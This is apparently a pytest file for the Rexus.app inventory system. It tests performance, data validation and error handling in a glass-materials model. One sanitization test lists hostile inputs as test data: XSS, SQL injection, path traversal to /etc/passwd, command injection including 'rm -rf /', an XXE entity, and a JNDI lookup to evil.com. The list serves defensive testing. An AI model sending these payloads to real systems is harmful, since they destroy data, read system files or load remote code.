#!/usr/bin/env python3
"""
Performance and Validation Tests - Rexus.app

Tests de rendimiento y validación para las correcciones implementadas.
"""

import pytest
import sys
import time
import threading
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock
from concurrent.futures import ThreadPoolExecutor

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from rexus.modules.vidrios.model import VidriosModel
from rexus.modules.obras.model import ObrasModel
from rexus.modules.usuarios.model import UsuariosModel
from rexus.modules.configuracion.model import ConfiguracionModel


class TestPerformanceOptimizations:
    """Tests de optimizaciones de rendimiento."""
    
    @pytest.fixture
    def mock_db_connection(self):
        """Mock database connection with realistic delays."""
        mock_conn = Mock()
        mock_cursor = Mock()
        
        def mock_execute_with_delay(*args, **kwargs):
            """Simulate database query execution time."""
            time.sleep(0.001)  # 1ms delay to simulate DB query
            return True
        
        mock_cursor.execute.side_effect = mock_execute_with_delay
        mock_cursor.fetchone.return_value = [1]
        mock_cursor.fetchall.return_value = [
            ('VT001', 'Vidrio Templado 6mm', 'Templado', 6.0, 'Proveedor A', 45.0)
        ] * 100  # Simulate 100 records
        mock_cursor.description = [
            ['codigo'], ['descripcion'], ['tipo'], ['espesor'], ['proveedor'], ['precio_m2']
        ]
        
        mock_conn.connection.cursor.return_value = mock_cursor
        return mock_conn
    
    def test_large_dataset_handling(self, mock_db_connection):
        """Test que los modelos manejen datasets grandes eficientemente."""
        
        # Simulate large dataset
        large_dataset = [
            ('VT{:04d}'.format(i), f'Vidrio {i}', 'Templado', 6.0, 'Proveedor', 45.0)
            for i in range(10000)
        ]
        
        mock_db_connection.connection.cursor().fetchall.return_value = large_dataset
        
        model = VidriosModel(mock_db_connection)
        
        start_time = time.time()
        vidrios = model.obtener_todos_vidrios()
        end_time = time.time()
        
        execution_time = end_time - start_time
        
        # Should handle large dataset in reasonable time
        assert execution_time < 1.0, f"Large dataset handling took {execution_time:.2f}s (too slow)"
        assert len(vidrios) == 10000
    
    def test_concurrent_database_access(self, mock_db_connection):
        """Test acceso concurrente a la base de datos."""
        
        model = VidriosModel(mock_db_connection)
        results = []
        errors = []
        
        def worker_function(worker_id):
            """Worker function for concurrent testing."""
            try:
                for i in range(10):
                    success, data = model.buscar_vidrios(f'test_{worker_id}_{i}')
                    results.append((worker_id, i, success, len(data) if data else 0))
                    time.sleep(0.001)  # Small delay between operations
            except Exception as e:
                errors.append((worker_id, str(e)))
        
        # Use ThreadPoolExecutor for better control
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(worker_function, i) for i in range(10)]
            
            # Wait for all to complete
            for future in futures:
                future.result()
        
        end_time = time.time()
        execution_time = end_time - start_time
        
        # Validate results
        assert len(errors) == 0, f"Concurrent access errors: {errors}"
        assert len(results) == 100, f"Expected 100 operations, got {len(results)}"
        assert execution_time < 5.0, f"Concurrent operations took {execution_time:.2f}s (too slow)"
    
    def test_sql_script_loading_performance(self, mock_db_connection):
        """Test que la carga de scripts SQL sea eficiente."""
        
        model = VidriosModel(mock_db_connection)
        
        # Mock script loader with caching simulation
        with patch.object(model.sql_loader, 'load_script') as mock_load:
            mock_load.return_value = "SELECT * FROM vidrios WHERE tipo = ?"
            
            # Perform multiple operations that use the same script
            start_time = time.time()
            
            for i in range(100):
                model.buscar_vidrios(f'test_{i}')
            
            end_time = time.time()
            execution_time = end_time - start_time
            
            # Should be reasonably fast with caching
            assert execution_time < 2.0, f"Script loading took {execution_time:.2f}s (too slow)"
            
            # Verify caching is working (script should be loaded once per unique script)
            unique_scripts = set(call[0][0] for call in mock_load.call_args_list)
            assert len(unique_scripts) <= 5, "Too many unique scripts loaded"
    
    def test_memory_usage_optimization(self, mock_db_connection):
        """Test que el uso de memoria esté optimizado."""
        
        import psutil
        import os
        
        process = psutil.Process(os.getpid())
        initial_memory = process.memory_info().rss
        
        model = VidriosModel(mock_db_connection)
        
        # Perform memory-intensive operations
        for i in range(1000):
            datos_vidrio = {
                'codigo': f'VT{i:04d}',
                'descripcion': f'Vidrio de prueba {i}' * 10,  # Large description
                'tipo': 'Templado',
                'proveedor': f'Proveedor {i}',
                'precio_m2': 45.0 + i
            }
            
            # This would normally create objects in memory
            result = model.crear_vidrio(datos_vidrio)
        
        final_memory = process.memory_info().rss
        memory_increase = final_memory - initial_memory
        
        # Memory increase should be reasonable (less than 100MB)
        memory_increase_mb = memory_increase / 1024 / 1024
        assert memory_increase_mb < 100, f"Memory usage increased by {memory_increase_mb:.2f}MB (too much)"
    
    def test_query_optimization(self, mock_db_connection):
        """Test que las consultas estén optimizadas."""
        
        model = VidriosModel(mock_db_connection)
        
        # Track query execution calls
        query_calls = []
        original_execute = mock_db_connection.connection.cursor().execute
        
        def track_execute(*args, **kwargs):
            query_calls.append(args[0] if args else "")
            return original_execute(*args, **kwargs)
        
        mock_db_connection.connection.cursor().execute.side_effect = track_execute
        
        # Perform operations that should use optimized queries
        model.buscar_vidrios('templado')
        model.obtener_estadisticas()
        model.obtener_todos_vidrios({'tipo': 'templado'})
        
        # Verify queries are using proper indexes and optimizations
        for query in query_calls:
            if isinstance(query, str):
                # Should not use SELECT *
                assert query.count('SELECT *') <= 1, f"Query uses SELECT *: {query[:100]}"
                
                # Should use proper WHERE clauses
                if 'WHERE' in query.upper():
                    assert '1=1' not in query or 'AND' in query, "Query should have proper conditions"


class TestDataValidation:
    """Tests de validación de datos."""
    
    @pytest.fixture
    def mock_db_connection(self):
        """Mock connection for validation testing."""
        mock_conn = Mock()
        mock_cursor = Mock()
        mock_conn.connection.cursor.return_value = mock_cursor
        mock_cursor.fetchone.return_value = [1]
        mock_cursor.fetchall.return_value = []
        mock_cursor.description = [['id'], ['name']]
        return mock_conn
    
    def test_input_sanitization_comprehensive(self, mock_db_connection):
        """Test comprensivo de sanitización de entrada."""
        
        model = VidriosModel(mock_db_connection)
        
        # Test data with various attack vectors
        malicious_inputs = [
            # XSS attempts
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            
            # SQL injection attempts
            "'; DROP TABLE vidrios; --",
            "1' OR '1'='1",
            "UNION SELECT * FROM usuarios",
            
            # Path traversal
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            
            # Command injection
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            
            # LDAP injection
            "admin)(&(password=*))",
            
            # XML injection
            "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
            
            # Template injection
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
        ]
        
        for malicious_input in malicious_inputs:
            # Test string sanitization
            sanitized = model.data_sanitizer.sanitize_string(malicious_input, max_length=100)
            
            # Should be safe string
            assert isinstance(sanitized, str), f"Sanitization failed for: {malicious_input}"
            assert len(sanitized) <= 100, "Sanitized string exceeds max length"
            
            # Should not contain dangerous patterns
            dangerous_patterns = ['<script', 'javascript:', 'DROP TABLE', 'UNION SELECT', '../', '..\\']
            for pattern in dangerous_patterns:
                assert pattern.lower() not in sanitized.lower(), f"Dangerous pattern '{pattern}' found in sanitized input"
    
    def test_numeric_validation_edge_cases(self, mock_db_connection):
        """Test validación numérica con casos límite."""
        
        model = VidriosModel(mock_db_connection)
        
        numeric_test_cases = [
            # Valid numbers
            ("123", 123),
            ("45.67", 45.67),
            ("0", 0),
            ("0.1", 0.1),
            
            # Edge cases
            ("", 0),
            (None, 0),
            ("0.0", 0.0),
            
            # Invalid inputs (should be handled gracefully)
            ("abc", 0),
            ("12.34.56", 0),
            ("--123", 0),
            ("123--", 0),
            ("Infinity", 0),
            ("NaN", 0),
            ("1e308", 0),  # Too large
        ]
        
        for input_val, expected_fallback in numeric_test_cases:
            result = model.data_sanitizer.sanitize_numeric(input_val, min_val=0, max_val=1000)
            
            # Should return a valid number or fallback
            assert isinstance(result, (int, float)), f"Numeric sanitization failed for: {input_val}"
            assert result >= 0, f"Sanitized number {result} below minimum for input: {input_val}"
            assert result <= 1000 or result == expected_fallback, f"Sanitized number {result} above maximum for input: {input_val}"
    
    def test_string_length_validation(self, mock_db_connection):
        """Test validación de longitud de cadenas."""
        
        model = VidriosModel(mock_db_connection)
        
        # Test various string lengths
        test_strings = [
            ("", 0),
            ("a", 1),
            ("a" * 50, 50),
            ("a" * 100, 100),
            ("a" * 500, 500),
            ("a" * 1000, 1000),
            ("a" * 10000, 10000),  # Very long string
        ]
        
        for test_string, expected_length in test_strings:
            # Test with different max lengths
            for max_length in [10, 50, 100, 500]:
                result = model.data_sanitizer.sanitize_string(test_string, max_length=max_length)
                
                expected_result_length = min(expected_length, max_length)
                assert len(result) == expected_result_length, \
                    f"String length validation failed: input={expected_length}, max={max_length}, result={len(result)}"
    
    def test_database_constraint_validation(self, mock_db_connection):
        """Test validación de restricciones de base de datos."""
        
        model = VidriosModel(mock_db_connection)
        
        # Test required field validation
        invalid_data_sets = [
            # Missing codigo
            {'descripcion': 'Test', 'tipo': 'Templado', 'proveedor': 'Test'},
            # Missing descripcion  
            {'codigo': 'VT001', 'tipo': 'Templado', 'proveedor': 'Test'},
            # Missing tipo
            {'codigo': 'VT001', 'descripcion': 'Test', 'proveedor': 'Test'},
            # Missing proveedor
            {'codigo': 'VT001', 'descripcion': 'Test', 'tipo': 'Templado'},
            # Empty values
            {'codigo': '', 'descripcion': 'Test', 'tipo': 'Templado', 'proveedor': 'Test'},
            {'codigo': 'VT001', 'descripcion': '', 'tipo': 'Templado', 'proveedor': 'Test'},
        ]
        
        for invalid_data in invalid_data_sets:
            success, message, vid_id = model.crear_vidrio(invalid_data)
            
            # Should fail validation
            assert success is False, f"Validation should fail for data: {invalid_data}"
            assert "obligatorio" in message.lower() or "requerido" in message.lower(), \
                f"Error message should indicate required field: {message}"
            assert vid_id is None, "ID should be None for failed validation"
    
    def test_business_logic_validation(self, mock_db_connection):
        """Test validación de lógica de negocio."""
        
        model = VidriosModel(mock_db_connection)
        
        # Test business rules
        business_test_cases = [
            # Negative prices should be handled
            {'codigo': 'VT001', 'descripcion': 'Test', 'tipo': 'Templado', 'proveedor': 'Test', 'precio_m2': -10},
            
            # Unrealistic dimensions
            {'codigo': 'VT002', 'descripcion': 'Test', 'tipo': 'Templado', 'proveedor': 'Test', 'espesor': -5},
            {'codigo': 'VT003', 'descripcion': 'Test', 'tipo': 'Templado', 'proveedor': 'Test', 'espesor': 1000},
            
            # Invalid status values
            {'codigo': 'VT004', 'descripcion': 'Test', 'tipo': 'Templado', 'proveedor': 'Test', 'estado': 'INVALID_STATUS'},
        ]
        
        for test_data in business_test_cases:
            success, message, vid_id = model.crear_vidrio(test_data)
            
            # Should either succeed with corrected values or fail with meaningful message
            if not success:
                assert len(message) > 0, "Error message should not be empty"
                assert vid_id is None, "ID should be None for failed creation"
            else:
                # If successful, values should be corrected
                assert vid_id is not None, "ID should not be None for successful creation"


class TestErrorHandling:
    """Tests de manejo de errores."""
    
    def test_database_connection_errors(self):
        """Test manejo de errores de conexión a base de datos."""
        
        # Test with no connection
        model = VidriosModel(None)
        
        # All methods should handle missing connection gracefully
        assert model.obtener_todos_vidrios() == []
        
        success, results = model.buscar_vidrios('test')
        assert success is True and results == []
        
        success, message, vid_id = model.crear_vidrio({
            'codigo': 'VT001',
            'descripcion': 'Test',
            'tipo': 'Templado',
            'proveedor': 'Test'
        })
        assert success is False
        assert "conexión" in message.lower()
        assert vid_id is None
    
    def test_sql_script_loading_errors(self):
        """Test manejo de errores en carga de scripts SQL."""
        
        mock_conn = Mock()
        mock_cursor = Mock()
        mock_conn.connection.cursor.return_value = mock_cursor
        mock_cursor.fetchone.return_value = [1]
        
        model = VidriosModel(mock_conn)
        
        # Mock script loader to raise exceptions
        with patch.object(model.sql_loader, 'load_script') as mock_load:
            mock_load.side_effect = FileNotFoundError("Script not found")
            
            # Should handle script loading errors gracefully
            success, results = model.buscar_vidrios('test')
            
            # Should not crash, but may return empty results or handle error
            assert isinstance(success, bool)
            assert isinstance(results, list)
    
    def test_data_corruption_handling(self):
        """Test manejo de datos corruptos o inesperados."""
        
        mock_conn = Mock()
        mock_cursor = Mock()
        mock_conn.connection.cursor.return_value = mock_cursor
        
        # Simulate corrupted data from database
        mock_cursor.fetchall.return_value = [
            # Missing fields, wrong types, null values
            (None, None, None, None, None, None),
            ("VT001", None, "Templado", "invalid_number", "", 0),
            ("", "Test Description", "", 6.0, "Test Provider", "invalid_price"),
        ]
        mock_cursor.description = [
            ['codigo'], ['descripcion'], ['tipo'], ['espesor'], ['proveedor'], ['precio_m2']
        ]
        
        model = VidriosModel(mock_conn)
        
        # Should handle corrupted data gracefully
        vidrios = model.obtener_todos_vidrios()
        
        assert isinstance(vidrios, list)
        # Each record should be handled, even if some fields are corrupted
        assert len(vidrios) <= 3


if __name__ == "__main__":
    pytest.main([__file__, "-v"])